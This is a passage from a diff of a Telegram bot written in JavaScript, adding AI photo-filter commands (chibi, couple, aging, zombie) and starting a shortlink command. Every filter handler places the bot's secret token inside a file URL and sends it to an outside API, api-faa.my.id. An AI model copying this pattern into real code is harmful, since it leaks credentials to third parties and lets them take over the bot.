+} else {
+errorMessage = `<blockquote>❌ Error memproses foto</blockquote>\n` +
+`<code>${escapeHTML(error.message || 'Unknown error')}</code>`;
+}
+await bot.sendMessage(chatId, errorMessage, {
+parse_mode: 'HTML',
+reply_to_message_id: msg.message_id
+});
+}
+}
+});
+
+//━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+// 🍼 TOCHIBI COMMAND - AI CHIBI FILTER
+//━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+bot.onText(/^\/tochibi$/, async (msg) => {
+const chatId = msg.chat.id;
+const userId = msg.from.id.toString();
+const username = msg.from.username ? `@${msg.from.username}` : msg.from.first_name || 'User';
+const chatType = msg.chat.type;
+const groupName = chatType === 'group' || chatType === 'supergroup' ? msg.chat.title : null;
+const messageText = '/tochibi';
+logUserInteraction(userId, username, chatType, messageText, groupName);
+if (!msg.reply_to_message || !msg.reply_to_message.photo) {
+return bot.sendMessage(chatId,
+`<blockquote>❌ Format salah!</blockquote>\n` +
+`<b>Reply foto dengan:</b> <code>/tochibi</code>\n\n` +
+`<i>Balas foto yang ingin diubah jadi chibi.</i>`,
+{ parse_mode: 'HTML', reply_to_message_id: msg.message_id }
+);
+}
+try {
+const photo = msg.reply_to_message.photo[msg.reply_to_message.photo.length - 1];
+const fileId = photo.file_id;
+const processingMsg = await bot.sendMessage(chatId,
+`<blockquote>🔄 Memproses foto...</blockquote>\n` +
+`<i>Mengaplikasikan filter chibi AI...</i>`,
+{ parse_mode: 'HTML', reply_to_message_id: msg.message_id }
+);
+const file = await bot.getFile(fileId);
+const filePath = file.file_path;
+const imageUrl = `https://api.telegram.org/file/bot${config.TELEGRAM_TOKEN}/${filePath}`;
+const encodedUrl = encodeURIComponent(imageUrl);
+const apiUrl = `https://api-faa.my.id/faa/tochibi?url=${encodedUrl}`;
+const response = await axios.get(apiUrl, { responseType: 'arraybuffer' });
+const contentType = response.headers["content-type"] || "";
+if (contentType.startsWith("image/")) {
+const imageBuffer = Buffer.from(response.data);
+await bot.sendPhoto(chatId, imageBuffer, {
+caption: `<blockquote>🍼 Foto kamu berhasil jadi chibi!</blockquote>\n` +
+`<i>Filter chibi AI berhasil diterapkan.</i>`,
+parse_mode: 'HTML',
+reply_to_message_id: msg.message_id
+});
+await bot.deleteMessage(chatId, processingMsg.message_id);
+} else {
+try {
+const jsonData = JSON.parse(response.data.toString());
+const imageUrlFromApi = jsonData.url || jsonData.result || jsonData.image || jsonData.data || jsonData.data?.url || jsonData.data?.result;
+if (!imageUrlFromApi) throw new Error('API tidak mengembalikan gambar');
+const imgResponse = await axios.get(imageUrlFromApi, { responseType: "arraybuffer" });
+const imageBuffer = Buffer.from(imgResponse.data);
+await bot.sendPhoto(chatId, imageBuffer, {
+caption: `<blockquote>🍼 Foto kamu jadi chibi imut!</blockquote>\n` +
+`<i>Filter chibi AI berhasil diterapkan.</i>`,
+parse_mode: 'HTML',
+reply_to_message_id: msg.message_id
+});
+await bot.deleteMessage(chatId, processingMsg.message_id);
+} catch (jsonError) {
+console.error('JSON parse error:', jsonError);
+await bot.editMessageText(
+`<blockquote>❌ Gagal memproses respons API</blockquote>\n` +
+`<code>${escapeHTML(jsonError.message)}</code>`,
+{ chat_id: chatId, message_id: processingMsg.message_id, parse_mode: 'HTML' }
+);
+}
+}
+} catch (error) {
+console.error('Tochibi error:', error);
+let errorMessage = '';
+if (error.response?.status === 500) {
+errorMessage = `<blockquote>⚠️ API sedang maintenance</blockquote>\n` +
+`<i>Tunggu beberapa saat untuk mencoba kembali.</i>`;
+} else if (error.message?.includes('timeout')) {
+errorMessage = `<blockquote>⏰ Timeout</blockquote>\n` +
+`<i>Proses terlalu lama. Coba foto yang lebih kecil.</i>`;
+} else {
+errorMessage = `<blockquote>❌ Error memproses foto</blockquote>\n` +
+`<code>${escapeHTML(error.message || 'Unknown error')}</code>`;
+}
+try {
+await bot.deleteMessage(chatId, processingMsg?.message_id || 0);
+} catch (e) {}
+await bot.sendMessage(chatId, errorMessage, {
+parse_mode: 'HTML',
+reply_to_message_id: msg.message_id
+});
+}
+});
+
+//━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+// 🍼 HANDLER UNTUK FOTO DENGAN CAPTION /TOCHIBI
+//━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+bot.on('photo', async (msg) => {
+const chatId = msg.chat.id;
+const userId = msg.from.id.toString();
+const username = msg.from.username ? `@${msg.from.username}` : msg.from.first_name || 'User';
+const chatType = msg.chat.type;
+const groupName = chatType === 'group' || chatType === 'supergroup' ? msg.chat.title : null;
+if (msg.caption && msg.caption.trim() === '/tochibi') {
+const messageText = 'PHOTO_CAPTION: /tochibi';
+logUserInteraction(userId, username, chatType, messageText, groupName);
+try {
+const fileId = msg.photo[msg.photo.length - 1].file_id;
+const processingMsg = await bot.sendMessage(chatId,
+`<blockquote>🔄 Memproses foto...</blockquote>\n` +
+`<i>Mengaplikasikan filter chibi AI...</i>`,
+{ parse_mode: 'HTML', reply_to_message_id: msg.message_id }
+);
+const file = await bot.getFile(fileId);
+const filePath = file.file_path;
+const imageUrl = `https://api.telegram.org/file/bot${config.TELEGRAM_TOKEN}/${filePath}`;
+const encodedUrl = encodeURIComponent(imageUrl);
+const apiUrl = `https://api-faa.my.id/faa/tochibi?url=${encodedUrl}`;
+const response = await axios.get(apiUrl, { responseType: 'arraybuffer' });
+const contentType = response.headers["content-type"] || "";
+if (contentType.startsWith("image/")) {
+const imageBuffer = Buffer.from(response.data);
+await bot.sendPhoto(chatId, imageBuffer, {
+caption: `<blockquote>🍼 Foto kamu berhasil jadi chibi!</blockquote>\n` +
+`<i>Filter chibi AI berhasil diterapkan.</i>`,
+parse_mode: 'HTML',
+reply_to_message_id: msg.message_id
+});
+await bot.deleteMessage(chatId, processingMsg.message_id);
+} else {
+try {
+const jsonData = JSON.parse(response.data.toString());
+const imageUrlFromApi = jsonData.url || jsonData.result || jsonData.image || jsonData.data || jsonData.data?.url || jsonData.data?.result;
+if (!imageUrlFromApi) throw new Error('API tidak mengembalikan gambar');
+const imgResponse = await axios.get(imageUrlFromApi, { responseType: "arraybuffer" });
+const imageBuffer = Buffer.from(imgResponse.data);
+await bot.sendPhoto(chatId, imageBuffer, {
+caption: `<blockquote>🍼 Foto kamu jadi chibi imut!</blockquote>\n` +
+`<i>Filter chibi AI berhasil diterapkan.</i>`,
+parse_mode: 'HTML',
+reply_to_message_id: msg.message_id
+});
+await bot.deleteMessage(chatId, processingMsg.message_id);
+} catch (jsonError) {
+console.error('JSON parse error:', jsonError);
+await bot.editMessageText(
+`<blockquote>❌ Gagal memproses respons API</blockquote>\n` +
+`<code>${escapeHTML(jsonError.message)}</code>`,
+{ chat_id: chatId, message_id: processingMsg.message_id, parse_mode: 'HTML' }
+);
+}
+}
+} catch (error) {
+console.error('Tochibi caption error:', error);
+let errorMessage = '';
+if (error.response?.status === 500) {
+errorMessage = `<blockquote>⚠️ API sedang maintenance</blockquote>\n` +
+`<i>Tunggu beberapa saat untuk mencoba kembali.</i>`;
+} else if (error.message?.includes('timeout')) {
+errorMessage = `<blockquote>⏰ Timeout</blockquote>\n` +
+`<i>Proses terlalu lama. Coba foto yang lebih kecil.</i>`;
+} else {
+errorMessage = `<blockquote>❌ Error memproses foto</blockquote>\n` +
+`<code>${escapeHTML(error.message || 'Unknown error')}</code>`;
+}
+await bot.sendMessage(chatId, errorMessage, {
+parse_mode: 'HTML',
+reply_to_message_id: msg.message_id
+});
+}
+}
+});
+
+//━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+// 💑 TOPACAR COMMAND - AI COUPLE FILTER
+//━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+bot.onText(/^\/topacar$/, async (msg) => {
+const chatId = msg.chat.id;
+const userId = msg.from.id.toString();
+const username = msg.from.username ? `@${msg.from.username}` : msg.from.first_name || 'User';
+const chatType = msg.chat.type;
+const groupName = chatType === 'group' || chatType === 'supergroup' ? msg.chat.title : null;
+const messageText = '/topacar';
+logUserInteraction(userId, username, chatType, messageText, groupName);
+if (!msg.reply_to_message || !msg.reply_to_message.photo) {
+return bot.sendMessage(chatId,
+`<blockquote>❌ Format salah!</blockquote>\n` +
+`<b>Reply foto dengan:</b> <code>/topacar</code>\n\n` +
+`<i>Balas foto yang ingin ditambahkan pasangan.</i>`,
+{ parse_mode: 'HTML', reply_to_message_id: msg.message_id }
+);
+}
+try {
+const photo = msg.reply_to_message.photo[msg.reply_to_message.photo.length - 1];
+const fileId = photo.file_id;
+const processingMsg = await bot.sendMessage(chatId,
+`<blockquote>🔄 Memproses foto...</blockquote>\n` +
+`<i>Mencari pasangan terbaik untukmu...</i>`,
+{ parse_mode: 'HTML', reply_to_message_id: msg.message_id }
+);
+const file = await bot.getFile(fileId);
+const filePath = file.file_path;
+const imageUrl = `https://api.telegram.org/file/bot${config.TELEGRAM_TOKEN}/${filePath}`;
+const encodedUrl = encodeURIComponent(imageUrl);
+const apiUrl = `https://api-faa.my.id/faa/topacar?url=${encodedUrl}`;
+const response = await axios.get(apiUrl, { responseType: "arraybuffer" });
+const contentType = response.headers["content-type"] || "";
+if (contentType.startsWith("image/")) {
+const imageBuffer = Buffer.from(response.data);
+await bot.sendPhoto(chatId, imageBuffer, {
+caption: `<blockquote>💑 Kamu punya pacar baru!</blockquote>\n` +
+`<i>Filter pasangan AI berhasil diterapkan.</i>`,
+parse_mode: 'HTML',
+reply_to_message_id: msg.message_id
+});
+await bot.deleteMessage(chatId, processingMsg.message_id);
+} else {
+try {
+const jsonData = JSON.parse(response.data.toString());
+const imageUrlFromApi = jsonData.url || jsonData.result || jsonData.image || jsonData.data || jsonData.data?.url;
+if (!imageUrlFromApi) throw new Error('API tidak mengembalikan gambar');
+const imgResponse = await axios.get(imageUrlFromApi, { responseType: "arraybuffer" });
+const imageBuffer = Buffer.from(imgResponse.data);
+await bot.sendPhoto(chatId, imageBuffer, {
+caption: `<blockquote>💑 Kamu punya pacar baru!</blockquote>\n` +
+`<i>Filter pasangan AI berhasil diterapkan.</i>`,
+parse_mode: 'HTML',
+reply_to_message_id: msg.message_id
+});
+await bot.deleteMessage(chatId, processingMsg.message_id);
+} catch (jsonError) {
+console.error('JSON parse error:', jsonError);
+await bot.editMessageText(
+`<blockquote>❌ Gagal memproses respons API</blockquote>\n` +
+`<code>${escapeHTML(jsonError.message)}</code>`,
+{ chat_id: chatId, message_id: processingMsg.message_id, parse_mode: 'HTML' }
+);
+}
+}
+} catch (error) {
+console.error('Topacar error:', error);
+let errorMessage = '';
+if (error.response?.status === 500) {
+errorMessage = `<blockquote>⚠️ API sedang maintenance</blockquote>\n` +
+`<i>Tunggu beberapa saat untuk mencoba kembali.</i>`;
+} else if (error.message?.includes('timeout')) {
+errorMessage = `<blockquote>⏰ Timeout</blockquote>\n` +
+`<i>Proses terlalu lama. Coba foto yang lebih kecil.</i>`;
+} else {
+errorMessage = `<blockquote>❌ Error memproses foto</blockquote>\n` +
+`<code>${escapeHTML(error.message || 'Unknown error')}</code>`;
+}
+try {
+await bot.deleteMessage(chatId, processingMsg?.message_id || 0);
+} catch (e) {}
+await bot.sendMessage(chatId, errorMessage, {
+parse_mode: 'HTML',
+reply_to_message_id: msg.message_id
+});
+}
+});
+
+//━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+// 💑 HANDLER UNTUK FOTO DENGAN CAPTION /TOPACAR
+//━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+bot.on('photo', async (msg) => {
+const chatId = msg.chat.id;
+const userId = msg.from.id.toString();
+const username = msg.from.username ? `@${msg.from.username}` : msg.from.first_name || 'User';
+const chatType = msg.chat.type;
+const groupName = chatType === 'group' || chatType === 'supergroup' ? msg.chat.title : null;
+if (msg.caption && msg.caption.trim() === '/topacar') {
+const messageText = 'PHOTO_CAPTION: /topacar';
+logUserInteraction(userId, username, chatType, messageText, groupName);
+try {
+const fileId = msg.photo[msg.photo.length - 1].file_id;
+const processingMsg = await bot.sendMessage(chatId,
+`<blockquote>🔄 Memproses foto...</blockquote>\n` +
+`<i>Mencari pasangan terbaik untukmu...</i>`,
+{ parse_mode: 'HTML', reply_to_message_id: msg.message_id }
+);
+const file = await bot.getFile(fileId);
+const filePath = file.file_path;
+const imageUrl = `https://api.telegram.org/file/bot${config.TELEGRAM_TOKEN}/${filePath}`;
+const encodedUrl = encodeURIComponent(imageUrl);
+const apiUrl = `https://api-faa.my.id/faa/topacar?url=${encodedUrl}`;
+const response = await axios.get(apiUrl, { responseType: "arraybuffer" });
+const contentType = response.headers["content-type"] || "";
+if (contentType.startsWith("image/")) {
+const imageBuffer = Buffer.from(response.data);
+await bot.sendPhoto(chatId, imageBuffer, {
+caption: `<blockquote>💑 Kamu punya pacar baru!</blockquote>\n` +
+`<i>Filter pasangan AI berhasil diterapkan.</i>`,
+parse_mode: 'HTML',
+reply_to_message_id: msg.message_id
+});
+await bot.deleteMessage(chatId, processingMsg.message_id);
+} else {
+try {
+const jsonData = JSON.parse(response.data.toString());
+const imageUrlFromApi = jsonData.url || jsonData.result || jsonData.image || jsonData.data || jsonData.data?.url;
+if (!imageUrlFromApi) throw new Error('API tidak mengembalikan gambar');
+const imgResponse = await axios.get(imageUrlFromApi, { responseType: "arraybuffer" });
+const imageBuffer = Buffer.from(imgResponse.data);
+await bot.sendPhoto(chatId, imageBuffer, {
+caption: `<blockquote>💑 Kamu punya pacar baru!</blockquote>\n` +
+`<i>Filter pasangan AI berhasil diterapkan.</i>`,
+parse_mode: 'HTML',
+reply_to_message_id: msg.message_id
+});
+await bot.deleteMessage(chatId, processingMsg.message_id);
+} catch (jsonError) {
+console.error('JSON parse error:', jsonError);
+await bot.editMessageText(
+`<blockquote>❌ Gagal memproses respons API</blockquote>\n` +
+`<code>${escapeHTML(jsonError.message)}</code>`,
+{ chat_id: chatId, message_id: processingMsg.message_id, parse_mode: 'HTML' }
+);
+}
+}
+} catch (error) {
+console.error('Topacar caption error:', error);
+let errorMessage = '';
+if (error.response?.status === 500) {
+errorMessage = `<blockquote>⚠️ API sedang maintenance</blockquote>\n` +
+`<i>Tunggu beberapa saat untuk mencoba kembali.</i>`;
+} else if (error.message?.includes('timeout')) {
+errorMessage = `<blockquote>⏰ Timeout</blockquote>\n` +
+`<i>Proses terlalu lama. Coba foto yang lebih kecil.</i>`;
+} else {
+errorMessage = `<blockquote>❌ Error memproses foto</blockquote>\n` +
+`<code>${escapeHTML(error.message || 'Unknown error')}</code>`;
+}
+await bot.sendMessage(chatId, errorMessage, {
+parse_mode: 'HTML',
+reply_to_message_id: msg.message_id
+});
+}
+}
+});
+
+//━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+// 👴 TOTUA COMMAND - AI AGING FILTER
+//━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+bot.onText(/^\/totua$/, async (msg) => {
+const chatId = msg.chat.id;
+const userId = msg.from.id.toString();
+const username = msg.from.username ? `@${msg.from.username}` : msg.from.first_name || 'User';
+const chatType = msg.chat.type;
+const groupName = chatType === 'group' || chatType === 'supergroup' ? msg.chat.title : null;
+const messageText = '/totua';
+logUserInteraction(userId, username, chatType, messageText, groupName);
+if (!msg.reply_to_message || !msg.reply_to_message.photo) {
+return bot.sendMessage(chatId,
+`<blockquote>❌ Format salah!</blockquote>\n` +
+`<b>Reply foto dengan:</b> <code>/totua</code>\n\n` +
+`<i>Balas foto yang ingin diubah jadi versi tua.</i>`,
+{ parse_mode: 'HTML', reply_to_message_id: msg.message_id }
+);
+}
+try {
+const photo = msg.reply_to_message.photo[msg.reply_to_message.photo.length - 1];
+const fileId = photo.file_id;
+const processingMsg = await bot.sendMessage(chatId,
+`<blockquote>🔄 Memproses foto...</blockquote>\n` +
+`<i>Mengaplikasikan filter penuaan AI...</i>`,
+{ parse_mode: 'HTML', reply_to_message_id: msg.message_id }
+);
+const file = await bot.getFile(fileId);
+const filePath = file.file_path;
+const imageUrl = `https://api.telegram.org/file/bot${config.TELEGRAM_TOKEN}/${filePath}`;
+const encodedUrl = encodeURIComponent(imageUrl);
+const apiUrl = `https://api-faa.my.id/faa/totua?url=${encodedUrl}`;
+const response = await axios.get(apiUrl, { responseType: 'arraybuffer' });
+const contentType = response.headers['content-type'] || '';
+if (contentType.startsWith('image/')) {
+const imageBuffer = Buffer.from(response.data);
+await bot.sendPhoto(chatId, imageBuffer, {
+caption: `<blockquote>👴 Kamu jadi versi tua!</blockquote>\n` +
+`<i>Filter penuaan AI berhasil diterapkan.</i>`,
+parse_mode: 'HTML',
+reply_to_message_id: msg.message_id
+});
+await bot.deleteMessage(chatId, processingMsg.message_id);
+} else {
+try {
+const jsonData = JSON.parse(response.data.toString());
+const imageUrlFromApi = jsonData.url || jsonData.result || jsonData.image || jsonData.data?.url;
+if (!imageUrlFromApi) throw new Error('API tidak mengembalikan gambar');
+const imgResponse = await axios.get(imageUrlFromApi, { responseType: 'arraybuffer' });
+const imageBuffer = Buffer.from(imgResponse.data);
+await bot.sendPhoto(chatId, imageBuffer, {
+caption: `<blockquote>👴 Kamu jadi versi tua!</blockquote>\n` +
+`<i>Filter penuaan AI berhasil diterapkan.</i>`,
+parse_mode: 'HTML',
+reply_to_message_id: msg.message_id
+});
+await bot.deleteMessage(chatId, processingMsg.message_id);
+} catch (jsonError) {
+console.error('JSON parse error:', jsonError);
+await bot.editMessageText(
+`<blockquote>❌ Gagal memproses respons API</blockquote>\n` +
+`<code>${escapeHTML(jsonError.message)}</code>`,
+{ chat_id: chatId, message_id: processingMsg.message_id, parse_mode: 'HTML' }
+);
+}
+}
+} catch (error) {
+console.error('Totua error:', error);
+let errorMessage = '';
+if (error.response?.status === 500) {
+errorMessage = `<blockquote>⚠️ API sedang maintenance</blockquote>\n` +
+`<i>Tunggu beberapa saat untuk mencoba kembali.</i>`;
+} else if (error.message?.includes('timeout')) {
+errorMessage = `<blockquote>⏰ Timeout</blockquote>\n` +
+`<i>Proses terlalu lama. Coba foto yang lebih kecil.</i>`;
+} else {
+errorMessage = `<blockquote>❌ Error memproses foto</blockquote>\n` +
+`<code>${escapeHTML(error.message || 'Unknown error')}</code>`;
+}
+try {
+await bot.deleteMessage(chatId, processingMsg?.message_id || 0);
+} catch (e) {}
+await bot.sendMessage(chatId, errorMessage, {
+parse_mode: 'HTML',
+reply_to_message_id: msg.message_id
+});
+}
+});
+
+//━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+// 👴 HANDLER UNTUK FOTO DENGAN CAPTION /TOTUA
+//━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+bot.on('photo', async (msg) => {
+const chatId = msg.chat.id;
+const userId = msg.from.id.toString();
+const username = msg.from.username ? `@${msg.from.username}` : msg.from.first_name || 'User';
+const chatType = msg.chat.type;
+const groupName = chatType === 'group' || chatType === 'supergroup' ? msg.chat.title : null;
+if (msg.caption && msg.caption.trim() === '/totua') {
+const messageText = 'PHOTO_CAPTION: /totua';
+logUserInteraction(userId, username, chatType, messageText, groupName);
+try {
+const fileId = msg.photo[msg.photo.length - 1].file_id;
+const processingMsg = await bot.sendMessage(chatId,
+`<blockquote>🔄 Memproses foto...</blockquote>\n` +
+`<i>Mengaplikasikan filter penuaan AI...</i>`,
+{ parse_mode: 'HTML', reply_to_message_id: msg.message_id }
+);
+const file = await bot.getFile(fileId);
+const filePath = file.file_path;
+const imageUrl = `https://api.telegram.org/file/bot${config.TELEGRAM_TOKEN}/${filePath}`;
+const encodedUrl = encodeURIComponent(imageUrl);
+const apiUrl = `https://api-faa.my.id/faa/totua?url=${encodedUrl}`;
+const response = await axios.get(apiUrl, { responseType: 'arraybuffer' });
+const contentType = response.headers['content-type'] || '';
+if (contentType.startsWith('image/')) {
+const imageBuffer = Buffer.from(response.data);
+await bot.sendPhoto(chatId, imageBuffer, {
+caption: `<blockquote>👴 Kamu jadi versi tua!</blockquote>\n` +
+`<i>Filter penuaan AI berhasil diterapkan.</i>`,
+parse_mode: 'HTML',
+reply_to_message_id: msg.message_id
+});
+await bot.deleteMessage(chatId, processingMsg.message_id);
+} else {
+try {
+const jsonData = JSON.parse(response.data.toString());
+const imageUrlFromApi = jsonData.url || jsonData.result || jsonData.image || jsonData.data?.url;
+if (!imageUrlFromApi) throw new Error('API tidak mengembalikan gambar');
+const imgResponse = await axios.get(imageUrlFromApi, { responseType: 'arraybuffer' });
+const imageBuffer = Buffer.from(imgResponse.data);
+await bot.sendPhoto(chatId, imageBuffer, {
+caption: `<blockquote>👴 Kamu jadi versi tua!</blockquote>\n` +
+`<i>Filter penuaan AI berhasil diterapkan.</i>`,
+parse_mode: 'HTML',
+reply_to_message_id: msg.message_id
+});
+await bot.deleteMessage(chatId, processingMsg.message_id);
+} catch (jsonError) {
+console.error('JSON parse error:', jsonError);
+await bot.editMessageText(
+`<blockquote>❌ Gagal memproses respons API</blockquote>\n` +
+`<code>${escapeHTML(jsonError.message)}</code>`,
+{ chat_id: chatId, message_id: processingMsg.message_id, parse_mode: 'HTML' }
+);
+}
+}
+} catch (error) {
+console.error('Totua caption error:', error);
+let errorMessage = '';
+if (error.response?.status === 500) {
+errorMessage = `<blockquote>⚠️ API sedang maintenance</blockquote>\n` +
+`<i>Tunggu beberapa saat untuk mencoba kembali.</i>`;
+} else if (error.message?.includes('timeout')) {
+errorMessage = `<blockquote>⏰ Timeout</blockquote>\n` +
+`<i>Proses terlalu lama. Coba foto yang lebih kecil.</i>`;
+} else {
+errorMessage = `<blockquote>❌ Error memproses foto</blockquote>\n` +
+`<code>${escapeHTML(error.message || 'Unknown error')}</code>`;
+}
+await bot.sendMessage(chatId, errorMessage, {
+parse_mode: 'HTML',
+reply_to_message_id: msg.message_id
+});
+}
+}
+});
+
+//━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+// 🧟 TOZOMBIE COMMAND - AI ZOMBIE FILTER
+//━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+bot.onText(/^\/tozombie$/, async (msg) => {
+const chatId = msg.chat.id;
+const userId = msg.from.id.toString();
+const username = msg.from.username ? `@${msg.from.username}` : msg.from.first_name || 'User';
+const chatType = msg.chat.type;
+const groupName = chatType === 'group' || chatType === 'supergroup' ? msg.chat.title : null;
+const messageText = '/tozombie';
+logUserInteraction(userId, username, chatType, messageText, groupName);
+if (!msg.reply_to_message || !msg.reply_to_message.photo) {
+return bot.sendMessage(chatId,
+`<blockquote>❌ Format salah!</blockquote>\n` +
+`<b>Reply foto dengan:</b> <code>/tozombie</code>\n\n` +
+`<i>Balas foto yang ingin diubah jadi zombie.</i>`,
+{ parse_mode: 'HTML', reply_to_message_id: msg.message_id }
+);
+}
+try {
+const photo = msg.reply_to_message.photo[msg.reply_to_message.photo.length - 1];
+const fileId = photo.file_id;
+const processingMsg = await bot.sendMessage(chatId,
+`<blockquote>🔄 Memproses foto...</blockquote>\n` +
+`<i>Mengaplikasikan filter zombie AI...</i>`,
+{ parse_mode: 'HTML', reply_to_message_id: msg.message_id }
+);
+const file = await bot.getFile(fileId);
+const filePath = file.file_path;
+const imageUrl = `https://api.telegram.org/file/bot${config.TELEGRAM_TOKEN}/${filePath}`;
+const encodedUrl = encodeURIComponent(imageUrl);
+const apiUrl = `https://api-faa.my.id/faa/tozombie?url=${encodedUrl}`;
+const response = await axios.get(apiUrl, { responseType: 'arraybuffer' });
+const contentType = response.headers['content-type'] || '';
+if (contentType.startsWith('image/')) {
+const imageBuffer = Buffer.from(response.data);
+await bot.sendPhoto(chatId, imageBuffer, {
+caption: `<blockquote>🧟 Kamu jadi zombie!</blockquote>\n` +
+`<i>Filter zombie AI berhasil diterapkan.</i>`,
+parse_mode: 'HTML',
+reply_to_message_id: msg.message_id
+});
+await bot.deleteMessage(chatId, processingMsg.message_id);
+} else {
+try {
+const jsonData = JSON.parse(response.data.toString());
+const imageUrlFromApi = jsonData.url || jsonData.result || jsonData.image || jsonData.data?.url;
+if (!imageUrlFromApi) throw new Error('API tidak mengembalikan gambar');
+const imgResponse = await axios.get(imageUrlFromApi, { responseType: 'arraybuffer' });
+const imageBuffer = Buffer.from(imgResponse.data);
+await bot.sendPhoto(chatId, imageBuffer, {
+caption: `<blockquote>🧟 Kamu jadi zombie!</blockquote>\n` +
+`<i>Filter zombie AI berhasil diterapkan.</i>`,
+parse_mode: 'HTML',
+reply_to_message_id: msg.message_id
+});
+await bot.deleteMessage(chatId, processingMsg.message_id);
+} catch (jsonError) {
+console.error('JSON parse error:', jsonError);
+await bot.editMessageText(
+`<blockquote>❌ Gagal memproses respons API</blockquote>\n` +
+`<code>${escapeHTML(jsonError.message)}</code>`,
+{ chat_id: chatId, message_id: processingMsg.message_id, parse_mode: 'HTML' }
+);
+}
+}
+} catch (error) {
+console.error('Tozombie error:', error);
+let errorMessage = '';
+if (error.response?.status === 500) {
+errorMessage = `<blockquote>⚠️ API sedang maintenance</blockquote>\n` +
+`<i>Tunggu beberapa saat untuk mencoba kembali.</i>`;
+} else if (error.message?.includes('timeout')) {
+errorMessage = `<blockquote>⏰ Timeout</blockquote>\n` +
+`<i>Proses terlalu lama. Coba foto yang lebih kecil.</i>`;
+} else {
+errorMessage = `<blockquote>❌ Error memproses foto</blockquote>\n` +
+`<code>${escapeHTML(error.message || 'Unknown error')}</code>`;
+}
+try {
+await bot.deleteMessage(chatId, processingMsg?.message_id || 0);
+} catch (e) {}
+await bot.sendMessage(chatId, errorMessage, {
+parse_mode: 'HTML',
+reply_to_message_id: msg.message_id
+});
+}
+});
+
+//━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+// 🧟 HANDLER UNTUK FOTO DENGAN CAPTION /TOZOMBIE
+//━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+bot.on('photo', async (msg) => {
+const chatId = msg.chat.id;
+const userId = msg.from.id.toString();
+const username = msg.from.username ? `@${msg.from.username}` : msg.from.first_name || 'User';
+const chatType = msg.chat.type;
+const groupName = chatType === 'group' || chatType === 'supergroup' ? msg.chat.title : null;
+if (msg.caption && msg.caption.trim() === '/tozombie') {
+const messageText = 'PHOTO_CAPTION: /tozombie';
+logUserInteraction(userId, username, chatType, messageText, groupName);
+try {
+const fileId = msg.photo[msg.photo.length - 1].file_id;
+const processingMsg = await bot.sendMessage(chatId,
+`<blockquote>🔄 Memproses foto...</blockquote>\n` +
+`<i>Mengaplikasikan filter zombie AI...</i>`,
+{ parse_mode: 'HTML', reply_to_message_id: msg.message_id }
+);
+const file = await bot.getFile(fileId);
+const filePath = file.file_path;
+const imageUrl = `https://api.telegram.org/file/bot${config.TELEGRAM_TOKEN}/${filePath}`;
+const encodedUrl = encodeURIComponent(imageUrl);
+const apiUrl = `https://api-faa.my.id/faa/tozombie?url=${encodedUrl}`;
+const response = await axios.get(apiUrl, { responseType: 'arraybuffer' });
+const contentType = response.headers['content-type'] || '';
+if (contentType.startsWith('image/')) {
+const imageBuffer = Buffer.from(response.data);
+await bot.sendPhoto(chatId, imageBuffer, {
+caption: `<blockquote>🧟 Kamu jadi zombie!</blockquote>\n` +
+`<i>Filter zombie AI berhasil diterapkan.</i>`,
+parse_mode: 'HTML',
+reply_to_message_id: msg.message_id
+});
+await bot.deleteMessage(chatId, processingMsg.message_id);
+} else {
+try {
+const jsonData = JSON.parse(response.data.toString());
+const imageUrlFromApi = jsonData.url || jsonData.result || jsonData.image || jsonData.data?.url;
+if (!imageUrlFromApi) throw new Error('API tidak mengembalikan gambar');
+const imgResponse = await axios.get(imageUrlFromApi, { responseType: 'arraybuffer' });
+const imageBuffer = Buffer.from(imgResponse.data);
+await bot.sendPhoto(chatId, imageBuffer, {
+caption: `<blockquote>🧟 Kamu jadi zombie!</blockquote>\n` +
+`<i>Filter zombie AI berhasil diterapkan.</i>`,
+parse_mode: 'HTML',
+reply_to_message_id: msg.message_id
+});
+await bot.deleteMessage(chatId, processingMsg.message_id);
+} catch (jsonError) {
+console.error('JSON parse error:', jsonError);
+await bot.editMessageText(
+`<blockquote>❌ Gagal memproses respons API</blockquote>\n` +
+`<code>${escapeHTML(jsonError.message)}</code>`,
+{ chat_id: chatId, message_id: processingMsg.message_id, parse_mode: 'HTML' }
+);
+}
+}
+} catch (error) {
+console.error('Tozombie caption error:', error);
+let errorMessage = '';
+if (error.response?.status === 500) {
+errorMessage = `<blockquote>⚠️ API sedang maintenance</blockquote>\n` +
+`<i>Tunggu beberapa saat untuk mencoba kembali.</i>`;
+} else if (error.message?.includes('timeout')) {
+errorMessage = `<blockquote>⏰ Timeout</blockquote>\n` +
+`<i>Proses terlalu lama. Coba foto yang lebih kecil.</i>`;
+} else {
+errorMessage = `<blockquote>❌ Error memproses foto</blockquote>\n` +
+`<code>${escapeHTML(error.message || 'Unknown error')}</code>`;
+}
+await bot.sendMessage(chatId, errorMessage, {
+parse_mode: 'HTML',
+reply_to_message_id: msg.message_id
+});
+}
+}
+});
+
+//━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+// 🔗 SHORTLINK COMMAND - SIMPLE API
+//━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+bot.onText(/^\/shortlink(?:\s+(.+))?$/i, async (msg, match) => {
+const chatId = msg.chat.id;
+const userId = msg.from.id.toString();
+const username = msg.from.username ? `@${msg.from.username}` : msg.from.first_name || 'User';
+const chatType = msg.chat.type;
+const groupName = chatType === 'group' || chatType === 'supergroup' ? msg.chat.title : null;
+const text = match[1];
